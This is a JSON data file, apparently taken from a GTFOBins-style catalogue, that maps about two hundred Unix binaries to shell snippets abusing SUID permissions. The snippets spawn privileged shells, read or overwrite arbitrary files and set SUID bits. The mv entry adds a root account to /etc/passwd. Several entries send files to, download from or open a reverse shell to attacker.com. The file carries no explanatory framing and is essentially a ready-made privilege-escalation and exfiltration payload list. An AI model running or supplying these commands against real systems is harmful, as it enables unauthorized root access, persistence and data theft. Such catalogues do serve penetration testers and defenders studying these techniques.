{"ab": ["URL=http://attacker.com/\nLFILE=file_to_send\n./ab -p $LFILE $URL"], "agetty": ["./agetty -o -p -l /bin/sh -a root tty"], "ar": ["TF=$(mktemp -u)\nLFILE=file_to_read\n./ar r \"$TF\" \"$LFILE\"\ncat \"$TF\""], "arj": ["TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\n./arj e \"$TF/a\" $LDIR"], "arp": ["LFILE=file_to_read\n./arp -v -f \"$LFILE\""], "as": ["LFILE=file_to_read\n./as @$LFILE"], "ascii-xfr": ["LFILE=file_to_read\n./ascii-xfr -ns \"$LFILE\""], "ash": ["./ash"], "aspell": ["LFILE=file_to_read\n./aspell -c \"$LFILE\""], "atobm": ["LFILE=file_to_read\n./atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'"], "awk": ["LFILE=file_to_read\n./awk '//' \"$LFILE\""], "base32": ["LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode"], "base64": ["LFILE=file_to_read\n./base64 \"$LFILE\" | base64 --decode"], "basenc": ["LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64"], "bash": ["./bash -p"], "bridge": ["LFILE=file_to_read\n./bridge -b \"$LFILE\""], "busybox": ["./busybox sh"], "bzip2": ["LFILE=file_to_read\n./bzip2 -c $LFILE | bzip2 -d"], "capsh": ["./capsh --gid=0 --uid=0 --"], "cat": ["LFILE=file_to_read\n./cat \"$LFILE\""], "chmod": ["LFILE=file_to_change\n./chmod 6777 $LFILE"], "chown": ["LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE"], "chroot": ["./chroot / /bin/sh -p"], "cmp": ["LFILE=file_to_read\n./cmp $LFILE /dev/zero -b -l"], "column": ["LFILE=file_to_read\n./column $LFILE"], "comm": ["LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null"], "cp": ["cp /usr/bin/gpasswd /tmp/gpasswd.bac\ncp /bin/bash /usr/bin/gpasswd\n/usr/bin/gpasswd -p"], "cpio": ["LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | ./cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\"", "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | ./cpio -R 0:0 -p $LDIR"], "cpulimit": ["./cpulimit -l 100 -f -- /bin/sh -p"], "csh": ["./csh -b"], "csplit": ["LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01"], "csvtool": ["LFILE=file_to_read\n./csvtool trim t $LFILE"], "cupsfilter": ["LFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE"], "curl": ["URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE"], "cut": ["LFILE=file_to_read\n./cut -d \"\" -f1 \"$LFILE\""], "dash": ["./dash -p"], "date": ["LFILE=file_to_read\n./date -f $LFILE"], "dd": ["LFILE=file_to_write\necho \"data\" | ./dd of=$LFILE"], "dialog": ["LFILE=file_to_read\n./dialog --textbox \"$LFILE\" 0 0"], "diff": ["LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE"], "dig": ["LFILE=file_to_read\n./dig -f $LFILE"], "dmsetup": ["./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'"], "docker": ["./docker run -v /:/mnt --rm -it alpine chroot /mnt sh"], "dosbox": ["LFILE='\\path\\to\\file_to_write'\n./dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit"], "ed": ["./ed file_to_read\n,p\nq"], "efax": ["LFILE=file_to_read\n./efax -d \"$LFILE\""], "emacs": ["./emacs -Q -nw --eval '(term \"/bin/sh -p\")'"], "env": ["./env /bin/sh -p"], "eqn": ["LFILE=file_to_read\n./eqn \"$LFILE\""], "expand": ["LFILE=file_to_read\n./expand \"$LFILE\""], "expect": ["./expect -c 'spawn /bin/sh -p;interact'"], "file": ["LFILE=file_to_read\n./file -f $LFILE"], "find": ["./find . -exec /bin/sh -p \\; -quit"], "fish": ["./fish"], "flock": ["./flock -u / /bin/sh -p"], "fmt": ["LFILE=file_to_read\n./fmt -999 \"$LFILE\""], "fold": ["LFILE=file_to_read\n./fold -w99999999 \"$LFILE\""], "gawk": ["LFILE=file_to_read\n./gawk '//' \"$LFILE\""], "gcore": ["./gcore $PID"], "gdb": ["./gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit"], "genisoimage": ["LFILE=file_to_read\n./genisoimage -sort \"$LFILE\""], "gimp": ["./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"], "grep": ["LFILE=file_to_read\n./grep '' $LFILE"], "gtester": ["TF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF"], "gzip": ["LFILE=file_to_read\n./gzip -f $LFILE -t"], "hd": ["LFILE=file_to_read\n./hd \"$LFILE\""], "head": ["LFILE=file_to_read\n./head -c1G \"$LFILE\""], "hexdump": ["LFILE=file_to_read\n./hexdump -C \"$LFILE\""], "highlight": ["LFILE=file_to_read\n./highlight --no-doc --failsafe \"$LFILE\""], "hping3": ["./hping3\n/bin/sh -p"], "iconv": ["LFILE=file_to_read\n./iconv -f 8859_1 -t 8859_1 \"$LFILE\""], "install": ["LFILE=file_to_change\nTF=$(mktemp)\n./install -m 6777 $LFILE $TF"], "ionice": ["./ionice /bin/sh -p"], "ip": ["LFILE=file_to_read\n./ip -force -batch \"$LFILE\"", "./ip netns add foo\n./ip netns exec foo /bin/sh -p\n./ip netns delete foo"], "ispell": ["./ispell /etc/passwd\n!/bin/sh -p"], "jjs": ["echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()\" | ./jjs"], "join": ["LFILE=file_to_read\njoin -a 2 /dev/null $LFILE"], "jq": ["LFILE=file_to_read\n./jq -Rr . \"$LFILE\""], "jrunscript": ["./jrunscript -e \"exec('/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)')\""], "ksh": ["./ksh -p"], "ksshell": ["LFILE=file_to_read\n./ksshell -i $LFILE"], "ld.so": ["./ld.so /bin/sh -p"], "less": ["./less file_to_read"], "logsave": ["./logsave /dev/null /bin/sh -i -p"], "look": ["LFILE=file_to_read\n./look '' \"$LFILE\""], "lua": ["lua -e 'local f=io.open(\"file_to_read\", \"rb\"); print(f:read(\"*a\")); io.close(f);'"], "make": ["COMMAND='/bin/sh -p'\n./make -s --eval=$'x:\\n\\t-'\"$COMMAND\""], "mawk": ["LFILE=file_to_read\n./mawk '//' \"$LFILE\""], "more": ["./more file_to_read"], "mosquitto": ["LFILE=file_to_read\n./mosquitto -c \"$LFILE\""], "msgattrib": ["LFILE=file_to_read\n./msgattrib -P $LFILE"], "msgcat": ["LFILE=file_to_read\n./msgcat -P $LFILE"], "msgconv": ["LFILE=file_to_read\n./msgconv -P $LFILE"], "msgfilter": ["echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'"], "msgmerge": ["LFILE=file_to_read\n./msgmerge -P $LFILE /dev/null"], "msguniq": ["LFILE=file_to_read\n./msguniq -P $LFILE"], "mv": ["cp /etc/passwd /tmp/passwd.bac\ncp /etc/passwd /tmp/passwd.copy\necho 'root125:$6$XYve5DPaJ07W8hah$bUwkQVpAbuOpZNgL/EGbV55WPSKKWKr4fakGWHQJNDOkFCmSlEyZ7jwSgGAhhUeAiBYh8ceDSaJfGSyCS6gnU1:0:0:root:/root:/bin/bash' >> /tmp/passwd.copy\nmv /tmp/passwd.copy /etc/passwd\nsu root125 # password"], "nasm": ["LFILE=file_to_read\n./nasm -@ $LFILE"], "nawk": ["LFILE=file_to_read\n./nawk '//' \"$LFILE\""], "nice": ["./nice /bin/sh -p"], "nl": ["LFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE"], "nm": ["LFILE=file_to_read\n./nm @$LFILE"], "nmap": ["LFILE=file_to_write\n./nmap -oG=$LFILE DATA"], "node": ["./node -e 'child_process.spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'"], "nohup": ["./nohup /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""], "od": ["LFILE=file_to_read\n./od -An -c -w9999 \"$LFILE\""], "openssl": ["openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345", "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s", "LFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\""], "openvpn": ["./openvpn --dev null --script-security 2 --up '/bin/sh -p -c \"sh -p\"'", "LFILE=file_to_read\n./openvpn --config \"$LFILE\""], "paste": ["LFILE=file_to_read\npaste $LFILE"], "perf": ["./perf stat /bin/sh -p"], "perl": ["./perl -e 'exec \"/bin/sh\";'"], "pg": ["./pg file_to_read"], "php": ["CMD=\"/bin/sh\"\n./php -r \"pcntl_exec('/bin/sh', ['-p']);\""], "pr": ["LFILE=file_to_read\npr -T $LFILE"], "ptx": ["LFILE=file_to_read\n./ptx -w 5000 \"$LFILE\""], "python": ["./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"], "readelf": ["LFILE=file_to_read\n./readelf -a @$LFILE"], "restic": ["RHOST=attacker.com\nRPORT=12345\nLFILE=file_or_dir_to_get\nNAME=backup_name\n./restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\""], "rev": ["LFILE=file_to_read\n./rev $LFILE | rev"], "rlwrap": ["./rlwrap -H /dev/null /bin/sh -p"], "rsync": ["./rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"], "run-parts": ["./run-parts --new-session --regex '^sh$' /bin --arg='-p'"], "rview": ["./rview -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"], "rvim": ["./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"], "sash": ["./sash"], "sed": ["LFILE=file_to_read\n./sed -e '' \"$LFILE\""], "setarch": ["./setarch $(arch) /bin/sh -p"], "shuf": ["LFILE=file_to_write\n./shuf -e DATA -o \"$LFILE\""], "soelim": ["LFILE=file_to_read\n./soelim \"$LFILE\""], "sort": ["LFILE=file_to_read\n./sort -m \"$LFILE\""], "sqlite3": ["LFILE=file_to_read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import $LFILE t\nSELECT * FROM t;\nEOF"], "ss": ["LFILE=file_to_read\n./ss -a -F $LFILE"], "ssh-keygen": ["./ssh-keygen -D ./lib.so"], "ssh-keyscan": ["LFILE=file_to_read\n./ssh-keyscan -f $LFILE"], "sshpass": ["./sshpass /bin/sh -p"], "start-stop-daemon": ["./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p"], "stdbuf": ["./stdbuf -i0 /bin/sh -p"], "strace": ["./strace -o /dev/null /bin/sh -p"], "strings": ["LFILE=file_to_read\n./strings \"$LFILE\""], "sysctl": ["LFILE=file_to_read\n./sysctl -n \"/../../$LFILE\""], "systemctl": ["TF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/sh -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF"], "tac": ["LFILE=file_to_read\n./tac -s 'RANDOM' \"$LFILE\""], "tail": ["LFILE=file_to_read\n./tail -c1G \"$LFILE\""], "taskset": ["./taskset 1 /bin/sh -p"], "tbl": ["LFILE=file_to_read\n./tbl $LFILE"], "tclsh": ["./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr"], "tee": ["cp /usr/bin/gpasswd /tmp/gpasswd.bac\ncat /bin/bash | tee /usr/bin/gpasswd\n/usr/bin/gpasswd -p"], "tftp": ["RHOST=attacker.com\n./tftp $RHOST\nput file_to_send"], "tic": ["LFILE=file_to_read\n./tic -C \"$LFILE\""], "time": ["./time /bin/sh -p"], "timeout": ["./timeout 7d /bin/sh -p"], "troff": ["LFILE=file_to_read\n./troff $LFILE"], "ul": ["LFILE=file_to_read\n./ul \"$LFILE\""], "unexpand": ["LFILE=file_to_read\n./unexpand -t99999999 \"$LFILE\""], "uniq": ["LFILE=file_to_read\n./uniq \"$LFILE\""], "unshare": ["./unshare -r /bin/sh"], "update-alternatives": ["LFILE=/path/to/file_to_write\nTF=$(mktemp)\necho DATA >$TF\n./update-alternatives --force --install \"$LFILE\" x \"$TF\" 0"], "uudecode": ["LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode"], "uuencode": ["LFILE=file_to_read\nuuencode \"$LFILE\" /dev/stdout | uudecode"], "view": ["./view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"], "vigr": ["./vigr"], "vim": ["./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"], "vimdiff": ["./vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"], "vipw": ["./vipw"], "watch": ["./watch -x sh -c 'reset; exec sh 1>&0 2>&0'"], "wc": ["LFILE=file_to_read\n./wc --files0-from \"$LFILE\""], "wget": ["URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./wget $URL -O $LFILE"], "whiptail": ["LFILE=file_to_read\n./whiptail --textbox --scrolltext \"$LFILE\" 0 0"], "xargs": ["./xargs -a /dev/null sh -p"], "xmodmap": ["LFILE=file_to_read\n./xmodmap -v $LFILE"], "xmore": ["LFILE=file_to_read\n./xmore $LFILE"], "xxd": ["LFILE=file_to_read\n./xxd \"$LFILE\" | xxd -r"], "xz": ["LFILE=file_to_read\n./xz -c \"$LFILE\" | xz -d"], "zsh": ["./zsh"], "zsoelim": ["LFILE=file_to_read\n./zsoelim \"$LFILE\""]}